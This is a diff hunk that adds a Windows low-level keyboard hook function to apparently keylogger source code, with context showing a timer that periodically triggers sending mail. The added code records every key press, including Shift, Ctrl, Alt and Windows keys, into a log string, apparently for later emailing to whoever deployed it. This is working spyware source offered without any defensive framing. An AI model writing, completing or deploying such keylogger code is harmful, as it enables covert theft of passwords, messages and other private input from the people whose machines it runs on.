@@ -37,6 +37,40 @@ Timer MailTimer(TimerSendMail, 2000 * 60, Timer::Infinite); // time to send
 
 HHOOK eHook = NULL; // pointer to our hook
 
+LRESULT OurKeyBoardProc(int nCode, WPARAM wparam, LPARAM lparam) // intercept key presses
+{
+	// wparam - key type, lparam - type of KBDLLHOOKSTRUCT
+	// look in KeyConstants.h for key mapping
+	if (nCode < 0)
+		CallNextHookEx(eHook, nCode, wparam, lparam);
+
+	KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lparam;
+	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) // check when key is pressed down or hold
+	{
+		keylog += Keys::KEYS[kbs->vkCode].Name; // use the system name from keyboard and use our map to convert it to a human friendly name
+		if (kbs->vkCode == VK_RETURN) // new line if enter was pressed
+			keylog += '\n';
+	}
+	else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP) // if key state is released, used for sys keys like SHIFT
+	{
+		DWORD key = kbs->vkCode;
+		if (key == VK_CONTROL || key == VK_LCONTROL ||
+			key == VK_RCONTROL || key == VK_SHIFT ||
+			key == VK_RSHIFT || key == VK_LSHIFT ||
+			key == VK_MENU || key == VK_LMENU ||
+			key == VK_RMENU || key == VK_CAPITAL ||
+			key == VK_NUMLOCK || key == VK_LWIN ||
+			key == VK_RWIN)
+		{
+			std::string KeyName = Keys::KEYS[kbs->vkCode].Name; // translate key to human friendly name
+			KeyName.insert(1, "/"); // insert like [SHIFT] [a] [b] [/SHIFT]
+			keylog += KeyName;
+		}
+	}
+
+	return CallNextHookEx(eHook, nCode, wparam, lparam);
+}
+
 
 
 
